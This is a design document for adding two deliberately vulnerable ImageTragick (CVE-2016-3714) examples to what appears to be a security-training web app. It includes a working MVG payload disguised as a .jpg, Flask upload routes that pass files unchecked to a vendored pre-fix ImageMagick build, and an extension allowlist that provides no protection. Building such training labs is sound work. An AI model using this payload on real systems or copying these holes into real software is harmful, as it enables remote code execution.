# A06 ImageMagick "ImageTragick" (CVE-2016-3714) RCE Addition — Design

## Goal

Add 2 new intentionally-vulnerable examples to A06 (Vulnerable and Outdated Components), forming a new "Vulnerable Library: ImageMagick ImageTragick RCE" group — bringing the app from 103 to 105 examples. Both examples achieve **genuine remote code execution** via a real, unpatched build of ImageMagick, matching this project's standing rule that vulnerable dependencies are the real thing, never simulated.

This follows a user request to add a Log4Shell-caliber real CVE with genuine RCE impact to A06. Log4Shell itself was scoped out (needs a full JVM sidecar service — the heaviest possible infra lift). ImageMagick's CVE-2016-3714 ("ImageTragick") was chosen instead: equally real, equally famous, and — critically — reproducible with only a compiled C binary inside the existing Python/Flask container, no new language runtime or sidecar service needed.

## Empirical Verification (performed before finalizing this design)

This example's entire premise depends on runtime behavior that had to be proven, not assumed — matching this project's standing practice for any exploit that depends on a specific library/runtime behavior (established in rounds 3-7).

1. **Confirmed the project's actual base image ships a patched ImageMagick.** `python:3.12-slim`'s Debian package is ImageMagick 7.1.1-43 (Debian 13 "trixie"), many years newer than the 2016 fix. The classic PoC (`fill 'url(https://.../x.jpg"|command")'`) fails against it even with `policy.xml` fully opened up — modern IM validates the color argument and rejects the malformed string *before* it ever reaches the vulnerable delegate-invocation code. **A genuinely pre-fix binary is required; a policy.xml misconfiguration on a modern build is not sufficient.**
2. **Located and vendored a genuinely vulnerable release.** ImageMagick's own release-archive server no longer resolves, and the GitHub mirror (`ImageMagick/ImageMagick6`) has no tags reaching back to the 2016 era. A long-running academic FOSS mirror (`ftp.icm.edu.pl`) still serves the full historical release archive. **ImageMagick-6.9.2-10** (the last release before the fix landed in 6.9.3-10) was downloaded, verified, and vendored into this repo at `vendor/ImageMagick-6.9.2-10.tar.xz` (sha256 `da2f6fba43d69f20ddb11783f13f77782b0b57783dde9cda39c9e5e733c2013c`) — vendored rather than fetched at Docker build time so the build never depends on any external mirror staying up.
3. **Confirmed it compiles cleanly against the project's actual base image.** `./configure --without-x --disable-openmp --without-perl && make -j4 && make install` succeeds with only a `python:3.12-slim` container plus `build-essential libjpeg-dev libpng-dev libtiff-dev zlib1g-dev pkg-config xz-utils wget`. No source patches needed.
4. **Confirmed genuine RCE fires.** The classic PoC, saved as an MVG script but named with a misleading `.jpg` extension:
   ```
   push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg"|id > /tmp/a06_imagetragick_proof.txt;false")'
   pop graphic-context
   ```
   run through `convert poc.jpg out.png`, causes ImageMagick's HTTPS delegate to shell out to `curl` with the crafted string embedded in its command line — and the injected `id > ...` command genuinely executes (verified: the proof file appears on disk with real command output). `curl` must be present in the runtime image for the delegate to be invoked at all (confirmed: without it, ImageMagick reports `sh: 1: curl: not found` before ever reaching the injection).
5. **Confirmed the extension-spoofing detail that makes the Hard example possible.** The exploit fired with the file named `.jpg`, *not* `.mvg` — ImageMagick detects the real format from file **content**, ignoring the extension entirely. A naive "only accept `.jpg`/`.png`/`.gif`" allowlist provides zero protection, since the malicious file already satisfies it.
6. **Decided single-stage over multi-stage Docker build.** A multi-stage build (compile in a builder stage, copy just the binaries into a lean final stage) was considered, but `ldd` on the compiled `convert` binary shows 12+ runtime shared-library dependencies (`libMagickCore`/`libMagickWand` plus `libjbig`, `libtiff`, `libjpeg`, `libpng16`, `libwebp`, `liblzma`, `libz`, `libzstd`, `libLerc`, `libdeflate`, `libsharpyuv`, `libstdc++`) — correctly enumerating the exact runtime (non-`-dev`) package for each across Debian releases is fragile, and a single missing one would silently break the exploit for anyone who rebuilds this image. Given this project's standing priority of genuine correctness over image size, the Dockerfile installs the build toolchain directly in the single existing image stage (matching its current single-stage style) rather than risk that failure mode. This trades a larger final image for zero risk of a missing-runtime-library class of bug.

## Design

### New A06 group: "Vulnerable Library: ImageMagick ImageTragick RCE"

Mirrors this category's existing two-example-per-library pattern (jQuery: bug → chained to session theft; Lodash: bug → bypasses a client-side check): a base example demonstrating the raw vulnerability, then a Hard example showing a natural "fix attempt" that doesn't actually help.

**Example 1 — "ImageTragick RCE via Image Upload" (Medium)**

A new "thumbnail generator" feature: `POST /a06/thumbnail-generator` accepts an uploaded file, saves it, and shells out to the real vulnerable `convert` binary to resize it — with zero validation of any kind.

```python
THUMBNAILS_DIR = os.path.join(BASE_DIR, "instance", "a06_thumbnails")
IMAGETRAGICK_PROOF_PATH = "/tmp/a06_imagetragick_proof.txt"

@a06_bp.route("/thumbnail-generator", methods=["GET", "POST"])
def thumbnail_generator():
    output = None
    if request.method == "POST":
        os.makedirs(THUMBNAILS_DIR, exist_ok=True)
        image = request.files.get("image")
        if image and image.filename:
            input_path = os.path.join(THUMBNAILS_DIR, image.filename)
            image.save(input_path)
            output_path = os.path.join(THUMBNAILS_DIR, "thumbnail.png")
            # VULNERABLE: shells out to a genuinely vulnerable ImageMagick
            # build (CVE-2016-3714 "ImageTragick") with zero validation of
            # the uploaded file's actual content.
            result = subprocess.run(
                ["convert", input_path, "-resize", "200x200", output_path],
                capture_output=True, text=True, timeout=10,
            )
            output = result.stdout or result.stderr or "(no output)"
    proof = None
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        with open(IMAGETRAGICK_PROOF_PATH) as f:
            proof = f.read()
    return render_template(
        "a06_vulnerable_components/thumbnail_generator.html", output=output, proof=proof
    )
```

**Exploit:** upload a file named `poc.jpg` containing the MVG payload from verification step 4 above. The "thumbnail generation" step genuinely executes `id > /tmp/a06_imagetragick_proof.txt`; the page then displays the proof file's real content — mirroring this app's established "safe proof of execution" convention (`sqli-to-rce`, `argument-injection-tar-export`).

**Example 2 — "ImageTragick Bypasses an Image-Extension Allowlist" (Hard)**

A second route, `POST /a06/thumbnail-generator-filtered`, adds a naive extension check before doing the *exact same* unsafe `convert` call:

```python
ALLOWED_THUMBNAIL_EXTENSIONS = (".jpg", ".jpeg", ".png", ".gif")

@a06_bp.route("/thumbnail-generator-filtered", methods=["GET", "POST"])
def thumbnail_generator_filtered():
    output = None
    blocked = False
    if request.method == "POST":
        os.makedirs(THUMBNAILS_DIR, exist_ok=True)
        image = request.files.get("image")
        if image and image.filename:
            if not image.filename.lower().endswith(ALLOWED_THUMBNAIL_EXTENSIONS):
                blocked = True
            else:
                input_path = os.path.join(THUMBNAILS_DIR, image.filename)
                image.save(input_path)
                output_path = os.path.join(THUMBNAILS_DIR, "thumbnail_filtered.png")
                # VULNERABLE: the extension check only confirms the
                # FILENAME looks like an image -- ImageMagick still
                # detects the real file format from its CONTENT, so the
                # identical MVG payload, merely named "poc.jpg", sails
                # through this check unchanged.
                result = subprocess.run(
                    ["convert", input_path, "-resize", "200x200", output_path],
                    capture_output=True, text=True, timeout=10,
                )
                output = result.stdout or result.stderr or "(no output)"
    proof = None
    if os.path.exists(IMAGETRAGICK_PROOF_PATH):
        with open(IMAGETRAGICK_PROOF_PATH) as f:
            proof = f.read()
    return render_template(
        "a06_vulnerable_components/thumbnail_generator_filtered.html",
        output=output, blocked=blocked, proof=proof,
    )
```

**Exploit:** the identical `poc.jpg` payload from Example 1 already satisfies the `.jpg` allowlist, so the "fix" changes nothing.

### Infrastructure changes

**`Dockerfile`** (single-stage, per verification step 6): before the existing `pip install` step, add a `RUN` block that installs the build toolchain (`build-essential wget curl ca-certificates xz-utils libjpeg-dev libpng-dev libtiff-dev zlib1g-dev pkg-config`) and `curl` (required at *runtime* for the HTTPS delegate — this is the actual vulnerable primitive, not incidental), `COPY`s in `vendor/ImageMagick-6.9.2-10.tar.xz`, verifies its sha256 against the value recorded in `vendor/README.md`, extracts and compiles it (`./configure --without-x --disable-openmp --without-perl && make -j"$(nproc)" && make install && ldconfig`), and removes the extracted source tree afterward (the tarball itself and the installed `/usr/local/bin/convert`/libs remain). This is the ONLY ImageMagick on the image — the Debian-packaged `imagemagick` is never installed, so there's no ambiguity about which binary `convert` on `PATH` resolves to.

**`.dockerignore`**: already does not exclude `vendor/` — no change needed (confirmed by reading the file fresh).

### Test strategy

Mirrors the exact established precedent in `tests/test_a03_argument_injection.py` for tests that depend on a specific real system binary not universally available in local dev/CI environments (this app's tests run against an in-memory SQLite database and are documented as not requiring Docker — meaning a bare `pytest` run on a contributor's machine will almost never have this specific vulnerable `convert` build on `PATH`, exactly like GNU tar isn't guaranteed on macOS):

```python
def _convert_version_string():
    convert_path = shutil.which("convert")
    if not convert_path:
        return None
    result = subprocess.run([convert_path, "-version"], capture_output=True, text=True)
    return result.stdout

requires_vulnerable_imagemagick = pytest.mark.skipif(
    "ImageMagick 6.9.2-10" not in (_convert_version_string() or ""),
    reason="requires the exact pre-CVE-2016-3714-fix ImageMagick 6.9.2-10 this "
    "app's real Docker image compiles from vendor/ImageMagick-6.9.2-10.tar.xz; "
    "a local test environment's ImageMagick (if any) is a different, patched version",
)
```

Both the RCE-proof tests are gated behind this marker (they are the "1 more skipped" test locally, exactly matching the existing `requires_gnu_tar`-gated test's precedent — the full suite's current "587 passed, 1 skipped" becomes "N passed, 2 skipped" locally, while genuinely proving RCE when actually run inside the project's own Docker image). A separate, ungated test confirms the routes render and reject/accept uploads structurally without needing the real binary at all (matching `test_export_archive_page_renders`'s pattern of an always-runnable smoke test alongside the gated real-exploit test).

## Data Model Approach

No new SQLAlchemy models — both examples are filesystem-only (`instance/a06_thumbnails/`), following the exact precedent of A01's `DOCUMENTS_DIR`/`AVATARS_DIR` and A03's `ATTACHMENTS_DIR`.

## Self-Review

**Placeholder scan:** no TBD/TODO; every mechanism, file path, and command was verified by actually running it, not assumed.

**Internal consistency:** both examples' category/group/difficulty placement checked against A06's actual current `__init__.py` (read fresh: 6 examples, 3 groups, all Easy→Medium→Hard sorted) — the new group appends cleanly at the end with no renumbering of existing entries.

**Ambiguity check:** the two highest-risk unknowns going in — "does the classic PoC still work against *any* readily-available ImageMagick" and "single-stage vs. multi-stage Docker build" — were both resolved by direct experimentation (a real compile-and-exploit cycle in a container matching the project's actual base image), not by assumption from the CVE's public write-ups alone.

**Scope check:** this spec covers exactly the 2 user-approved examples (ImageTragick base RCE + extension-allowlist bypass). Log4Shell and the FCKEditor file-upload reference are explicitly out of scope for this round, per the user's own decision in this conversation.
